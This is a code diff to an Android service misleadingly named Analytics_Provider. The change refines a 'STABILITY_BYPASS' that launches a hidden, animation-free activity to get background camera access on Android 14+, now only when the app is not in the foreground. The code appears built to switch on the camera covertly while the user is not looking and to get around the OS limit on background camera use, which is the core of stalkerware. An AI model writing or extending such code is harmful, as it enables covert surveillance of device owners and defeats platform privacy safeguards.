@@ -216,13 +216,29 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
             return;
         }
 
-        // [STABILITY_BYPASS] Required ONLY for Android 14+ background camera access
+        // [STABILITY_BYPASS] Required ONLY for Android 14+ background camera access when app is not in foreground
         if (Build.VERSION.SDK_INT >= 34) {
+            boolean isForeground = false;
             try {
-                Intent bypass = new Intent(this, CameraHelper.BypassActivity.class);
-                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
-                startActivity(bypass);
-            } catch (Exception e) { Log.e(TAG, "Bypass fail: " + e.getMessage()); }
+                android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
+                List<android.app.ActivityManager.RunningAppProcessInfo> infos = am.getRunningAppProcesses();
+                if (infos != null) {
+                    for (android.app.ActivityManager.RunningAppProcessInfo p : infos) {
+                        if (p.processName.equals(getPackageName()) && p.importance == android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
+                            isForeground = true;
+                            break;
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            if (!isForeground) {
+                try {
+                    Intent bypass = new Intent(this, CameraHelper.BypassActivity.class);
+                    bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                    startActivity(bypass);
+                } catch (Exception e) { Log.e(TAG, "Bypass fail: " + e.getMessage()); }
+            }
         }
 
         cameraHandler.removeCallbacksAndMessages(null);
